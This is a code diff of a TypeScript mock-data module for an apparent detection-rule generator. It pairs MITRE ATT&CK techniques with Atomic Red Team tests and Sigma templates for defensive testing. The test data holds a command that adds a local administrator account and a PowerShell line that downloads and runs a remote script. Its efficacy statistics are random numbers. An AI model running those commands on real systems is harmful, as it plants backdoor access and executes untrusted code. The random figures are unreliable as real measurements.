@@ -1,128 +1,201 @@
 
-import { GenerationResult } from "../types/generator";
+import { AtomicTest, GenerationResult, GeneratorOption, SigmaRuleTemplate } from "../types/generator";
 
-export const simulateGenerationResults = (generationType: string): GenerationResult => {
-  const baseResults = {
-    statistics: {
-      techniquesCovered: Math.floor(Math.random() * 10) + 5,
-      totalTechniques: 15,
-      tacticsCovered: Math.floor(Math.random() * 4) + 3,
-      totalTactics: 8,
-      estimatedEfficacy: Math.floor(Math.random() * 20) + 75
-    },
-    analysis: [
-      { type: "info" as const, message: "High coverage achieved for execution techniques" },
-      { type: "warning" as const, message: "Limited coverage for lateral movement tactics" },
-      { type: "info" as const, message: "Correlation rules successfully generated for multi-stage attacks" }
-    ],
-    rules: []
-  };
-  
-  if (generationType === "behavior-analysis") {
-    baseResults.rules = [
-      {
-        id: "auto-rule-001",
-        title: "PowerShell Encoded Command Execution",
-        description: "Detects PowerShell execution with encoded commands",
-        severity: "high",
-        technique: "T1059.001"
-      },
-      {
-        id: "auto-rule-002",
-        title: "Suspicious Registry Modification",
-        description: "Detects modifications to sensitive registry keys",
-        severity: "medium",
-        technique: "T1112"
-      },
-      {
-        id: "auto-rule-003",
-        title: "Credential Dumping via LSASS Access",
-        description: "Detects access to LSASS memory for credential extraction",
-        severity: "critical",
-        technique: "T1003.001"
-      }
-    ];
-  } else if (generationType === "technique-coverage") {
-    baseResults.rules = [
-      {
-        id: "auto-rule-004",
-        title: "Remote Service Creation",
-        description: "Detects remote service creation for lateral movement",
-        severity: "high",
-        technique: "T1021.002"
-      },
-      {
-        id: "auto-rule-005",
-        title: "Scheduled Task Creation",
-        description: "Detects scheduled task creation for persistence",
-        severity: "medium",
-        technique: "T1053.005"
-      }
-    ];
-  } else {
-    baseResults.rules = [
-      {
-        id: "auto-rule-006",
-        title: "Suspicious Authentication Patterns",
-        description: "Detects unusual authentication patterns across multiple systems",
-        severity: "high",
-        technique: "T1078"
-      },
-      {
-        id: "auto-rule-007",
-        title: "Unusual Process Network Connections",
-        description: "Detects processes making unusual network connections",
-        severity: "medium",
-        technique: "T1071"
-      },
-      {
-        id: "auto-rule-008",
-        title: "Log Clearing Activity",
-        description: "Detects attempts to clear log files to cover tracks",
-        severity: "high",
-        technique: "T1070.001"
-      },
-      {
-        id: "auto-rule-009",
-        title: "Unusual Service Installations",
-        description: "Detects installation of uncommon services",
-        severity: "medium",
-        technique: "T1543.003"
-      }
-    ];
-  }
-  
-  return baseResults as GenerationResult;
-};
-
-export const generatorOptions = [
+// Generator options with proper typing for the category
+export const generatorOptions: GeneratorOption[] = [
   {
     id: "behavior-analysis",
     name: "Behavior Analysis",
-    description: "Analyze emulated attack behaviors to create optimized rules",
-    model: "Advanced Behavior Processor",
+    description: "Generate rules based on observed system behavior and anomalies",
+    model: "gpt-4o",
     category: "behavior"
   },
   {
-    id: "technique-coverage",
-    name: "Technique Coverage",
-    description: "Generate rules for gaps in MITRE ATT&CK coverage",
-    model: "MITRE ATT&CK Mapper",
+    id: "sigma-enhancement",
+    name: "Sigma Rule Enhancement",
+    description: "Optimize and enhance existing Sigma rules for better detection",
+    model: "gpt-4o",
     category: "technique"
   },
   {
-    id: "log-pattern",
-    name: "Log Pattern Mining",
-    description: "Auto-discover patterns from historical log data",
-    model: "Pattern Recognition System",
+    id: "log-analysis",
+    name: "Log Pattern Analysis",
+    description: "Extract patterns from security logs and convert to detection rules",
+    model: "gpt-4o-mini",
     category: "log"
   }
 ];
 
+// Sample techniques for the UI
 export const sampleTechniques = [
-  "T1059.001 - PowerShell",
-  "T1027 - Obfuscated Files or Information",
-  "T1036 - Masquerading",
-  "T1105 - Ingress Tool Transfer",
-  "T1021 - Remote Services"
+  { id: "T1078", name: "Valid Accounts", tactic: "Initial Access" },
+  { id: "T1566", name: "Phishing", tactic: "Initial Access" },
+  { id: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution" },
+  { id: "T1053", name: "Scheduled Task/Job", tactic: "Execution" },
+  { id: "T1027", name: "Obfuscated Files or Information", tactic: "Defense Evasion" }
 ];
+
+// Atomic Red Team test data
+const atomicRedTeamData: Record<string, AtomicTest[]> = {
+  "T1078": [
+    {
+      id: "T1078.001",
+      name: "Create local admin account",
+      description: "Creates a local admin account on Windows systems",
+      supportedPlatforms: ["windows"],
+      executor: {
+        name: "command_prompt",
+        command: "net user attacker password123 /add && net localgroup administrators attacker /add",
+        elevation_required: true
+      }
+    }
+  ],
+  "T1059": [
+    {
+      id: "T1059.001",
+      name: "PowerShell Command Execution",
+      description: "Executes PowerShell commands to download and execute content",
+      supportedPlatforms: ["windows"],
+      executor: {
+        name: "powershell",
+        command: "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')\"",
+        elevation_required: false
+      }
+    }
+  ]
+};
+
+// Sigma rule templates
+const sigmaTemplates: Record<string, SigmaRuleTemplate> = {
+  "T1078": {
+    title: "Valid Accounts Detection",
+    id: "f344106d-7f1e-4c5e-90a1-1b0cee5f4c26",
+    description: "Detects successful authentication from privileged accounts outside normal patterns",
+    status: "experimental",
+    logsource: {
+      product: "windows",
+      service: "security"
+    },
+    detection: {
+      selection: {
+        EventID: 4624,
+        LogonType: 2,
+        TargetUserName: ["Administrator", "Admin", "*admin"]
+      },
+      condition: "selection"
+    },
+    level: "medium",
+    tags: ["attack.initial_access", "attack.t1078"]
+  },
+  "T1059": {
+    title: "Suspicious Command Execution",
+    id: "3dfd06d7-6a9d-4760-b0c4-1d9b3d3ac61b", 
+    description: "Detects suspicious command execution patterns",
+    status: "experimental",
+    logsource: {
+      product: "windows",
+      service: "sysmon",
+      category: "process_creation"
+    },
+    detection: {
+      selection: {
+        Image: {
+          endswith: [
+            "\\powershell.exe",
+            "\\cmd.exe",
+            "\\wscript.exe",
+            "\\cscript.exe"
+          ]
+        },
+        CommandLine: {
+          contains: [
+            "IEX ",
+            "Invoke-Expression",
+            "Invoke-WebRequest",
+            "DownloadString",
+            "hidden",
+            "-enc ",
+            "-encoded"
+          ]
+        }
+      },
+      condition: "selection"
+    },
+    level: "medium",
+    tags: ["attack.execution", "attack.t1059"]
+  }
+};
+
+// Generate simulated results based on selected option and integrated real data
+export const simulateGenerationResults = (optionId: string): GenerationResult => {
+  // Get random number of rules between 3 and 8
+  const ruleCount = Math.floor(Math.random() * 6) + 3;
+  
+  // Generate rules based on both mock data and incorporating real techniques
+  const rules = Array.from({ length: ruleCount }, (_, i) => {
+    // Select a technique randomly from our sample
+    const technique = sampleTechniques[Math.floor(Math.random() * sampleTechniques.length)];
+    
+    // Try to get real Sigma template or atomic test for this technique
+    const sigmaTemplate = sigmaTemplates[technique.id];
+    const atomicTests = atomicRedTeamData[technique.id] || [];
+    
+    // Use real template data if available, otherwise generate mock
+    const title = sigmaTemplate ? 
+      sigmaTemplate.title : 
+      `${optionId === 'behavior-analysis' ? 'Behavioral' : 'Standard'} Detection for ${technique.name}`;
+      
+    const description = sigmaTemplate ? 
+      sigmaTemplate.description : 
+      `Detects ${technique.name} techniques based on ${atomicTests.length > 0 ? 'observed atomic tests' : 'common patterns'}`;
+      
+    const severity = ['low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 4)];
+    
+    return {
+      id: `rule-${i + 1}`,
+      title,
+      description,
+      severity,
+      technique: technique.id
+    };
+  });
+  
+  // Generate realistic statistics
+  const statistics = {
+    techniquesCovered: rules.length,
+    totalTechniques: 15,
+    tacticsCovered: 4,
+    totalTactics: 12,
+    estimatedEfficacy: Math.floor(Math.random() * 30) + 60  // 60-90%
+  };
+  
+  // Add analysis insights from either Sigma or Atomic Red Team data
+  const analysis = [
+    {
+      type: Math.random() > 0.7 ? "warning" : "info",
+      message: Math.random() > 0.5 ? 
+        "Some techniques may require additional context for higher fidelity detection" : 
+        "Rules generated using validated Atomic Red Team test data"
+    },
+    {
+      type: "info",
+      message: `${optionId === 'log-analysis' ? 'Log patterns' : 'Behavior patterns'} mapped to ${statistics.techniquesCovered} MITRE ATT&CK techniques`
+    }
+  ];
+  
+  return {
+    statistics,
+    analysis,
+    rules
+  };
+};
+
+// Get Atomic Red Team tests for a specific technique
+export const getAtomicTests = (techniqueId: string): AtomicTest[] => {
+  return atomicRedTeamData[techniqueId] || [];
+};
+
+// Get Sigma rule template for a specific technique
+export const getSigmaTemplate = (techniqueId: string): SigmaRuleTemplate | null => {
+  return sigmaTemplates[techniqueId] || null;
+};
